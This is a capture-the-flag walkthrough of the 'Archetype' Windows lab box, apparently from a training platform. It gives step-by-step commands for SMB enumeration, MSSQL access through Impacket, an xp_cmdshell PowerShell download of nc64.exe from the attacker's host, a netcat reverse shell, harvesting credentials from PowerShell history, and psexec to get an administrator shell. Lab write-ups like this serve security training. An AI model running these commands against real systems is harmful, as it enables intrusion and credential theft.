# Archetype

## Summary
We are able to find a password for user sql_svc in an smb share with no password  
Using this password, we use the Impacket tool mssqlclient to connect to the sql server which this box is hosting  
From there, we are able to get a reverse shell by uploading the netcat binary to the target machine  
Then, we enumerate the ConsoleHOST_history.txt file which shows us the administrator password  
With this, we use Impacket psexec.py to get a shell as administrator

## Enumeration
We find SMB ports are open and that there is a Microsoft SQL Server 2017 running on port 1433  
We first enumerate SMB with smbclient:  
`smbclient -N -L \\\\{target IP}\\`  
`-N` means no password  
We find that we can connect to the backups share with no password: `smbclient -N \\\\{target IP}\\backups`  
We find the password for user sql_svc M3g4c0rp123 written in plaintext in a file in this share

## Impacket
Impacket is a collection of Python classes for working with network protocols.  
Impacket is focused on providing low-level programatic access to the packets and for some protocols (eg SMB 1-3 and MSRPC) the protocol implementation itself  
mssqlclient.py is a script from Impacket collection which can be used in order to establish an authenticated connection to Microsoft SQL Server  
`/usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.152.164 -windows-auth`

## Getting a Reverse Shell
We will upload the nc64.exe binary to the target machine and execute an interacitve cmd.exe process on our listening port  
We start a simple HTTP server from the location of the binary on our system: `sudo python3 -m http.server 80`  
Then, we start a netcat listener (in a different tab): `sudo nc -lvnp 443`  
Then, from the SQL server we will download the file:  
``SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{our vpn tun ip}/nc64.exe -outfile nc64.exe``    
On the HTTP server tab you should see the GET request logged  
Now, we can bind the cmd.exe through the nc to our listener:
``SQL> xp_cmdshell `"powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {our vpn tun ip} 443"``  
Looking back at our netcat listener we can confirm our reverse shell and our foothold on the system

## Privlege Escalation
winPEAS is a tool which can automate a big part of the enumeration process in the target system  
we can download winpeas from our system to the target box through our http server:  
`powershell`  
`wget http://{our vpn tun ip}/winPEASx64.exe -outfile winPEASx64.exe`  
Then, `.\winPEAS.exe`  
This returns a lot of stuff, however for this box, we end up basically not using winPEAS at all  
We just go to the folder where PowerShell history is stored:  
`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline`  
`type ConsoleHost_history.txt` shows us the cleartext password for the administrator user which is MEGACORP_4dm1n!!

## PsExec
PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software  
PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IPConfig thaty otherwise do not have the ability to show information about remote systems  
Impacket has a script called psexec.py which provides PSEXEC like functionality  
Using this, and our administrator login, we can get a shell as an administrator:  
`python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@{Target_IP}`